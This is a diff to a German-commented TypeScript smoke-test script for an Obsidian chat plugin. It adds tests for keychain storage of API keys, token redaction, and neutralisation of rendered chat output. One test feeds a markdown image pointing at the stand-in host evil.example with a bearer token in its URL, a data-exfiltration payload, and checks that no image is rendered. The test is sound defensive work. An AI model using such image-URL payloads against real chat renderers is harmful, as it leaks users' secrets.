@@ -104,6 +104,9 @@ async function setSetting(cdp: Cdp, key: string, value: unknown): Promise<void> 
   await cdp.evaluate(`
     const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
     p.data.settings[${JSON.stringify(key)}] = ${JSON.stringify(value)};
+    // Die Verbindung merkt sich die lokale Auflösung bis invalidate() — die Einstellungen tun das nach jeder
+    // Listen- und Modelländerung selbst, der Treiber setzt die Werte am Tab vorbei.
+    p.llm?.invalidate();
     await p.persist();
     await new Promise((r) => setTimeout(r, 250));
     return true;
@@ -424,9 +427,12 @@ const MANAGER_DEFAULT_MODEL = 'smoke-manager-modell';
 /** Fake-Chat-Endpunkt: streamt eine Antwort mit Markdown und merkt sich Anfragen und Modell.
  *  CORS ist Pflicht — der Renderer läuft unter app://obsidian.md, ohne die Header sieht der
  *  Server die Anfrage nie (gemessen 2026-09-15 in lingotuner, dort dieselbe Bauart). */
-interface FakeChat { url: string; close: () => Promise<void>; calls: () => number; lastModel: () => string | null; lastBody: () => Record<string, unknown> | null }
-async function startFakeChat(): Promise<FakeChat> {
+interface FakeChat { url: string; close: () => Promise<void>; calls: () => number; lastModel: () => string | null; lastBody: () => Record<string, unknown> | null; lastAuth: () => string | null }
+/** `echo`: die Antwort wiederholt den letzten Nutzertext, wie der Server ihn empfangen hat (der Platzhalter, wenn das
+ *  Plugin geschwärzt hat) — so zeigt sich, was nach der Wiederherstellung im Chat landet. */
+async function startFakeChat(opts: { echo?: boolean } = {}): Promise<FakeChat> {
   let calls = 0;
+  let lastAuth: string | null = null;
   let lastModel: string | null = null;
   let lastBody: Record<string, unknown> | null = null;
   const server: Server = createServer((req, res) => {
@@ -442,11 +448,14 @@ async function startFakeChat(): Promise<FakeChat> {
     if (req.method === 'POST' && req.url?.includes('/v1/chat/completions') === true) {
       let body = '';
       req.on('data', (chunk: Buffer) => { body += chunk.toString('utf8'); });
+      lastAuth = (req.headers.authorization as string | undefined) ?? null;
       req.on('end', () => {
         calls += 1;
         try { lastBody = JSON.parse(body) as Record<string, unknown>; lastModel = (lastBody.model as string | undefined) ?? null; } catch { lastBody = null; lastModel = null; }
         res.writeHead(200, { 'Content-Type': 'text/event-stream' });
-        for (const stueck of ['Antwort mit **Fettung**', '\n\n', '- eins\n- zwei']) {
+        const letzter = (lastBody?.messages as { role: string; content: unknown }[] | undefined)?.filter((m) => m.role === 'user').pop();
+        const stuecke = opts.echo === true ? [`echo: ${String(letzter?.content ?? '')}`] : ['Antwort mit **Fettung**', '\n\n', '- eins\n- zwei'];
+        for (const stueck of stuecke) {
           res.write(`data: ${JSON.stringify({ choices: [{ delta: { content: stueck }, finish_reason: null }] })}\n\n`);
         }
         res.write(`data: ${JSON.stringify({ choices: [{ delta: {}, finish_reason: 'stop' }] })}\n\n`);
@@ -465,6 +474,7 @@ async function startFakeChat(): Promise<FakeChat> {
     calls: () => calls,
     lastModel: () => lastModel,
     lastBody: () => lastBody,
+    lastAuth: () => lastAuth,
   };
 }
 
@@ -653,7 +663,7 @@ async function sektionManager(cdp: Cdp): Promise<void> {
     };
     const text = await settingsText();
     await cdp.evaluate(`app.setting.close?.(); return true;`);
-    const zeigtManager = text !== null && (text.includes(de['src.managed']) || text.includes(en['src.managed']));
+    const zeigtManager = text !== null && (text.includes('Endpoints come from the LLM Endpoint Manager') || text.includes('Endpunkte kommen vom LLM Endpoint Manager'));
     record(
       'manager/einstellungen-zeigen-den-manager-abschnitt',
       zeigtManager,
@@ -692,7 +702,7 @@ async function sektionManager(cdp: Cdp): Promise<void> {
     await setSetting(cdp, 'chatEndpoints', [{ url: fake.url }]);
     await cdp.evaluate(`
       const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-      p.endpointResolver.invalidate();
+      p.llm.invalidate();
       p.chatSession.reset();
       await p.askKuro("Nochmal");
       return true;
@@ -705,6 +715,93 @@ async function sektionManager(cdp: Cdp): Promise<void> {
   } finally {
     await removeFakeManager(cdp);
     await fake.close();
+  }
+}
+
+/* ------------------------------ 14 · Verbindung (Kit 0.51.2): Schlüsselbund, Schwärzung, Neutralisierung */
+
+const GEHEIMNIS = 'smoke-geheimnis-4711-abcdefgh';
+const TOKEN = 'Bearer abcdef0123456789xyzABC';
+
+async function sektionVerbindung(cdp: Cdp): Promise<void> {
+  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
+  let fake: FakeChat | null = null;
+  try {
+    await removeFakeManager(cdp);
+    fake = await startFakeChat({ echo: true });
+
+    // V1 · Schlüsselbund: ein Endpunkt MIT Schlüssel, aufgelöst; danach steht kein Klartext mehr auf der Platte.
+    await setSetting(cdp, 'chatEndpoints', [{ url: fake.url, apiKey: GEHEIMNIS }]);
+    await setSetting(cdp, 'chatModel', MANAGER_DEFAULT_MODEL);
+    await setSetting(cdp, 'chatChoice', {});
+    await cdp.evaluate(`await ${P}.llm.resolve({ force: true }); await new Promise((r) => setTimeout(r, 600)); return true;`);
+    const platte = await cdp.evaluate<string>(`return await app.vault.adapter.read(app.vault.configDir + "/plugins/" + ${JSON.stringify(PLUGIN_ID)} + "/data.json");`);
+    const roh = platte.includes(GEHEIMNIS);
+    const hatId = /"secretId"/.test(platte);
+    record(
+      'verbindung/kein-apikey-in-data-json',
+      !roh && hatId,
+      roh ? 'Klartext-Schlüssel steht noch in data.json' : hatId ? 'data.json trägt secretId statt apiKey' : 'weder Klartext noch secretId gefunden',
+    );
+
+    // V2 · Schwärzung und Wiederherstellung samt Bearer-Header (der Schlüssel kommt aus dem Schlüsselbund zurück).
+    await cdp.evaluate(`
+      ${P}.chatSession.reset();
+      await ${P}.askKuro(${JSON.stringify(`bitte wiederholen: ${TOKEN}`)});
+      return true;
+    `);
+    const gesendet = JSON.stringify(fake.lastBody() ?? {});
+    record(
+      'verbindung/bearer-header-aus-dem-schluesselbund',
+      fake.lastAuth() === `Bearer ${GEHEIMNIS}`,
+      `Authorization am Server: ${fake.lastAuth() === null ? 'fehlt' : fake.lastAuth() === `Bearer ${GEHEIMNIS}` ? 'der Schlüssel aus dem Schlüsselbund' : 'abweichend'}`,
+    );
+    const antwort = await pollUntil<string | null>(
+      cdp,
+      `const md = ${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md"); return md && md.textContent.includes("echo:") ? md.textContent : null;`,
+      8000,
+    ).catch(() => null);
+    record(
+      'verbindung/schwaerzung-platzhalter-hin-original-zurueck',
+      !gesendet.includes('abcdef0123456789xyzABC') && antwort !== null && antwort.includes('abcdef0123456789xyzABC'),
+      `am Server ${gesendet.includes('abcdef0123456789xyzABC') ? 'im Klartext' : 'als Platzhalter'}; im Chat ${antwort?.includes('abcdef0123456789xyzABC') === true ? 'wieder das Original' : 'nicht wiederhergestellt'}`,
+    );
+
+    // V3 · Neutralisierung am echten Renderer: Bild-URL mit Platzhalter (kommt als Original zurück) und dataviewjs.
+    // Die spitzen Klammern erlauben das Leerzeichen im Token — ohne sie wäre es gar kein Bild und der Punkt nicht trennscharf.
+    await cdp.evaluate(`
+      ${P}.chatSession.reset();
+      await ${P}.askKuro(${JSON.stringify(`![x](<https://evil.example/?d=${TOKEN}>)`)});
+      return true;
+    `);
+    const bild = await pollUntil<{ img: number; text: string } | null>(
+      cdp,
+      `const md = ${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md"); return md && (md.textContent.includes("evil.example") || md.querySelector("img")) ? { img: md.querySelectorAll("img").length, text: md.textContent } : null;`,
+      8000,
+    ).catch(() => null);
+    record(
+      'verbindung/antwort-mit-bild-url-erzeugt-kein-img',
+      bild !== null && bild.img === 0,
+      bild === null ? 'Antwort nicht im Chat' : `${bild.img}× <img> in der gerenderten Antwort`,
+    );
+    const code = await cdp.evaluate<{ blocks: number; text: boolean }>(`
+      ${P}.chatSession.reset();
+      ${P}.chatSession.append({ role: "assistant", text: "vorher\\n\\n\`\`\`dataviewjs\\ndv.paragraph(1)\\n\`\`\`\\n\\nnachher" });
+      ${P}.syncChat();
+      await new Promise((r) => setTimeout(r, 800));
+      const md = ${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md");
+      return { blocks: md ? md.querySelectorAll(".block-language-dataviewjs, .block-language-dataview").length : -1,
+               text: Boolean(md) && md.textContent.includes("dataviewjs") };
+    `);
+    record(
+      'verbindung/dataviewjs-block-rendert-als-text',
+      code.blocks === 0 && code.text,
+      `${code.blocks} aktive Blöcke, Text „dataviewjs“ ${code.text ? 'sichtbar' : 'fehlt'}`,
+    );
+  } finally {
+    await setSetting(cdp, 'chatEndpoints', []);
+    await cdp.evaluate(`${P}.chatSession.reset(); ${P}.syncChat(); return true;`);
+    if (fake) await fake.close();
   }
 }
 
@@ -758,7 +855,7 @@ async function sektionAnfrage(cdp: Cdp): Promise<void> {
     await setSetting(cdp, 'chatChoice', {});
     await setSetting(cdp, 'request', { overrides: {}, thinking: {}, lastOnLevel: {}, levelPickerInChat: false });
     const frage = async (): Promise<void> => {
-      await cdp.evaluate(`${P}.endpointResolver.invalidate(); ${P}.chatSession.reset(); await ${P}.askKuro("Hallo"); return true;`);
+      await cdp.evaluate(`${P}.llm.invalidate(); ${P}.chatSession.reset(); await ${P}.askKuro("Hallo"); return true;`);
     };
 
     // Body mit Modus-Defaults.
@@ -851,7 +948,7 @@ async function sektionEchterEndpunkt(cdp: Cdp): Promise<void> {
   await setSetting(cdp, 'chatEndpoints', [{ url: SMOKE_ENDPOINT_URL }]);
   await setSetting(cdp, 'chatModel', modell);
   await setSetting(cdp, 'request', { overrides: {}, thinking: { companion: 'off' }, lastOnLevel: {}, levelPickerInChat: false });
-  await cdp.evaluate(`app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].endpointResolver.invalidate(); return true;`);
+  await cdp.evaluate(`app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].llm.invalidate(); return true;`);
   await rebuildSidebar(cdp);
   await oeffneChatTab(cdp);
   // Mutation und Wartephase getrennt: `cdp.evaluate` bricht nach 30 s ab, ein echtes Modell braucht länger.
@@ -1391,6 +1488,10 @@ async function main(): Promise<void> {
     console.log('');
     console.log('── 13 · Sampling-Profile (Abschnitt „Anfrage“, Modus companion)');
     await sektionAnfrage(cdp);
+
+    console.log('');
+    console.log('── 14 · Verbindung (Schlüsselbund, Schwärzung, Neutralisierung)');
+    await sektionVerbindung(cdp);
     console.log('');
 
     console.log('── Nicht mechanisch prüfbar (bleibt Hand-Runde)');
